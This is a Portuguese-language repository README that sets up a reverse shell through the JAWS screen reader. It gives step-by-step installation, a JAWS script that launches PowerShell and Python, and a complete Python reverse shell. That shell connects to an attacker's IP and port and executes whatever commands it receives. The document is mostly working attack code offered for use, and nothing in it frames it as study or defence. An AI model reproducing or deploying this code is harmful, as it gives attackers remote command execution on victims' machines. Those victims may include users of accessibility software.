# Script de shell reverso para JAWS

Este repositório contém scripts para automatizar tarefas no JAWS (Job Access With Speech) usando uma combinação de scripts JAWS e scripts Python. O principal exemplo fornecido é uma configuração de shell reverso que utiliza o JAWS para iniciar o shell e o Python para estabelecer a conexão reversa.

## Estrutura do Repositório

- `NCPythonCall.jss`: Script JAWS para iniciar o processo de shell reverso.
- `ncat.py`: Script Python para estabelecer a conexão de shell reverso.

## Pré-requisitos

1. **JAWS Screen Reader**: Certifique-se de que o JAWS está instalado na sua máquina.
2. **Python**: Certifique-se de que o Python está instalado e acessível no PATH do sistema.
3. **Conhecimento em Scripting JAWS**: Entendimento básico de scripts JAWS.

## Instalação

### Importando e Usando o Script JAWS

1. **Baixe o Repositório**:
   - Clone ou baixe o repositório a partir do [GitHub](https://github.com/MatheusExner/JAWS_scripts).

2. **Abra o Gerenciador de Scripts JAWS**:
   - Pressione `Insert + 0` para abrir o Gerenciador de Scripts JAWS.

3. **Importe o Script**:
   - No Gerenciador de Scripts, vá em `Arquivo > Abrir` e navegue até o arquivo `NCPythonCall.jss` baixado.
   - Abra o arquivo para visualizar o script.

4. **Compile o Script**:
   - Pressione `Ctrl + Shift + D` para compilar o script.
   - Salve o script compilado com um nome significativo, por exemplo, `NCPythonCall.jsb`.

5. **Atribua um Atalho de Teclado**:
   - Para atribuir um atalho de teclado para executar seu script JAWS, vá em `Script > Modificar Atribuição de Tecla`.
   - Selecione o script `NCPythonCall`, pressione `Ctrl + Shift + K` e atribua um atalho de teclado (por exemplo, `Insert + Q`).

6. **Execute o Script**:
   - Pressione o atalho de teclado atribuído (`Insert + Q`) para executar o script.

### Configurando e Executando o Script Python

1. **Certifique-se de que o Python está Instalado**:
   - Baixe e instale o Python a partir do [site oficial](https://www.python.org/).

2. **Execute o Script Python**:
   - O script JAWS executará automaticamente o script Python se todos os caminhos estiverem corretamente configurados.

3. **Execução Manual (Opcional)**:
   - Para executar manualmente o script Python, abra o Prompt de Comando ou o PowerShell.
   - Navegue até o diretório que contém `ncat.py`.
   - Execute o script usando:
     ```sh
     python ncat.py
     ```

## Script JAWS: `NCPythonCall`

O script JAWS automatiza o processo de verificação dos componentes necessários e execução do script de shell reverso.

```jaws
Script NCPythonCall ()
Say ("Iniciando processo de shell reverso", OT_MESSAGE)

If FileExists ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
    Say ("powershell existe", OT_MESSAGE)
Else
    Say ("powershell não existe", OT_MESSAGE)
EndIf

If FileExists ("C:\\Users\\Matheus\\Desktop\\ncat.py")
    Say ("script encontrado", OT_MESSAGE)
Else
    Say ("script não encontrado", OT_MESSAGE)
EndIf

Run ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe python C:\\Users\\Matheus\\Desktop\\ncat.py")
EndScript
```

## Script python: `ncat.py`
O script Python estabelece uma conexão de shell reverso com a máquina especificada do atacante.
```python
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.114", 7890))

while True:
    command = s.recv(1024).decode("utf-8")
    if command.lower() == "exit":
        break
    if command:
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout, stderr = output.communicate()
        response = stdout + stderr
        s.send(response)

s.close()
```
